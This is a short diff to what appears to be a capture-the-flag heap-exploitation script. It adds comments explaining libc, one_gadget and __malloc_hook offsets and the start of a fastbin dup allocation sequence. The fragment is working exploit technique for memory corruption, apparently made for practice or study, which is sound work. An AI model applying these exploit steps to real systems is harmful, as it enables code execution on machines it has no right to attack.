@@ -18,7 +18,7 @@ def start():
 
 # Addresses
 libc_offset = 0x3c4b78 # Calculated by leaking unsortedbins with no aslr and calculating distance to libc base
-one_offset = 0x4527a
+one_offset = 0x4527a # one_gadget <libc>
 malloc_hook_offset = 0x3c4b10 # found using objdump -T <libc> | grep __malloc_hook
 rdi_off = 0x21112
 rdx_rsi_off = 0x1151c9
@@ -74,7 +74,7 @@ malloc_hook = libc_base + malloc_hook_offset
 
 # 2. fastbin dup
 
-malloc(0x80) # Old chunk, idx 2. Requested from unsortedbin
+malloc(0x80) # Old chunk, idx 2. Requested from unsortedbin, so we don't get it with the next malloc
 malloc(0x68) # A idx 3
 malloc(0x68) # B idx 4
 
